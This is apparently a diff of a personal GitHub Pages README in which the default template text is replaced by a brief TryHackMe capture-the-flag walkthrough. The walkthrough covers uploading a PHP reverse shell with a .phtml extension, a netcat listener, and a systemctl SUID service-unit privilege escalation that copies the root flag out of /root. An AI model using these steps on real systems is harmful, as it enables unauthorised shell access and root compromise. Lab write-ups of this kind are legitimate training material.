@@ -4,24 +4,35 @@ You can use the [editor on GitHub](https://github.com/vlngod/vlnblog/edit/gh-pag
 
 Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
-### Markdown
+### Vlnuniversity THM
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+```TargetIP:3333/internal/uploads/    (use directory  brute force to get this dir)```
 
-```markdown
-Syntax highlighted code block
+**Now upload a php reverse shell with .phtml extension**
+nc -lnvp 1234
 
-# Header 1
-## Header 2
-### Header 3
+now go to user bill and get the user flag:
 
-- Bulleted
-- List
+cd /home/bill/ ; ls   (now use cat and get he flag here)
 
-1. Numbered
-2. List
+### systemclt SUID exploit
+```TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id;ls /root;cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
 
-**Bold** and _Italic_ and `Code` text
+
+Post this run following to enable the services:
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+
+Now go to /tmp directory and cat output:
+cat /tmp/output (Red colored highlighted commands out will display)
+
+boom we got the root flag here'''
+
 
 [Link](url) and ![Image](src)
 ```
